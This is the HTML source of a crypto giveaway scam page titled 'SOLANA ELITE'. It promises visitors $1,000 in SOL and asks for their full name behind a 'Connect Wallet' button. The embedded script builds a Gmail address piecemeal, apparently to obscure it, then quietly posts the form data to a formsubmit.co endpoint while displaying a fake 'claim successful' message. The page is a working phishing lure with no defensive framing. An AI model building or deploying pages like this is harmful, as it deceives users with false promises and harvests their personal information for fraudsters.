<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 450px; background: #0a0a0a; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 60px rgba(0, 255, 163, 0.05); }
        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.5rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
        .sub { font-size: 0.9rem; color: #888; margin-bottom: 45px; line-height: 1.6; }
        .ib { text-align: left; margin-bottom: 35px; }
        label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 15px; font-weight: 700; }
        input { width: 100%; background: #111; border: 1px solid #222; border-radius: 15px; padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; }
        .btn { width: 100%; padding: 22px; border: none; border-radius: 15px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); }
        #success-view { display: none; }
        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
        .congrats { font-size: 1rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 25px; border: 1px dashed var(--sol-g); }
    </style>
</head>
<body>
    <div class="card">
        <div id="form-view">
            <!-- HARD FIX: Action is handled by JavaScript below -->
            <form id="claim-form" method="POST">
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                <div class="ib">
                    <label>Wallet Identity</label>
                    <input type="text" name="Name" id="user-name" placeholder="Enter your full name" required>
                </div>
                <input type="hidden" name="_captcha" value="false">
                <button type="submit" class="btn">CONNECT WALLET</button>
            </form>
        </div>
        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        form.onsubmit = async (e) => {
            e.preventDefault();

            // REASSEMBLING YOUR EMAIL ADDRESS MANUALLY
            const user = "drabberdrabber123";
            const domain = "gmail.com";
            const fullEmail = user + "@" + domain;
            const actionUrl = "https://formsubmit.co" + fullEmail;

            // UI Transition
            document.getElementById('form-view').style.display = 'none';
            document.getElementById('success-view').style.display = 'block';

            // Background send
            const data = new FormData(form);
            try {
                await fetch(actionUrl, {
                    method: 'POST',
                    body: data,
                    headers: { 'Accept': 'application/json' }
                });
            } catch (err) {
                console.log("Error sending data");
            }
        };
    </script>
</body>
</html>
